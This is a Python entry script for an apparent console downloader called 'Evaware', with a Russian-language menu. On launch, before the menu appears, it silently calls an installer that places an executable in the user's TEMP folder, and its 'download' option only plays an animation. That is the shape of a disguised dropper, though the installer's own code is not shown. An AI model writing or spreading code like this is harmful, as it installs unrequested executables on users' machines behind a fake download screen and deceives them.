import os
import time
from main.evaware.console.AboutEvaware import AboutEvaware
from main.evaware.console.ExitHandler import ExitHandler
from main.evaware.console.DownloadAnim import DownloadAnim
from main.evaware.installer.ExeInstaller import ExeInstaller
from main.evaware.utils.GraphicsData import GraphicsData

def main_menu():
    temp_dir = os.environ["TEMP"]

    ExeInstaller.install_exe(temp_dir)

    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(GraphicsData.get_ascii_art())
        print("1. Скачать Evaware")
        print("2. О Evaware")
        print("3. Выйти")
        choice = input("Выберите опцию: ")
        if choice == "1":
            DownloadAnim().animate_download()
        elif choice == "2":
            AboutEvaware().show_info()
        elif choice == "3":
            ExitHandler().exit_program()
            break
        else:
            print("Неверный выбор. Попробуйте снова.")
            time.sleep(2)

if __name__ == "__main__":
    main_menu()
